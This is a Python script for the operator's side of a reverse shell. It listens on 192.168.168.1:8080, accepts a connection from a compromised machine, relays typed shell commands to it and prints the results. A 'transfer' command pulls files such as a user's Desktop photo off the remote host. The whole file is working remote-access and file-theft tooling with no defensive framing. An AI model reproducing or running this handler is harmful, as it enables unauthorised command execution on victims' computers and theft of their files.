import socket 
import os

IPAddr = "192.168.168.1"
Port = 8080

def transfer(conn, command, file):
    
    conn.send(command.encode())
    outfile = file.split('/')[-1]
    with open(outfile,'wb') as f:
        while True: 
            bits = conn.recv(1024)
            if 'Unable to locate the file' in bits.decode():
                print('[-] Unable to locate the file')
                break
            if bits.decode().endswith('Transfer Completed'):
                print('[+] Transfer completed ')
                break
            f.write(bits)
    
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((IPAddr, Port))
    s.listen(1)
    print(f'[+] Listening on port {Port}')
    conn, addr = s.accept()
    print('[+] Connection established with: ', addr)

    while True: 
        command = input("Shell> ")
        if 'exit' in command:
            conn.send('exit'.encode())
            conn.close() 
            break

# Copy file from remote machine
# Example: transfer C:\Users\mafranks\Desktop\photo.jpg

        elif 'transfer' in command:
            try:
                file = command.split(' ')[1]
                transfer(conn, command, file)
            except IndexError as e:
                print("Make sure you use the proper syntax:")
                print("transfer C:/Users/mafranks/Desktop/photo.jpg")
                pass

        else:
            conn.send(command.encode()) 
            print(conn.recv(1024).decode()) 
        
def main ():
    connect()
main()
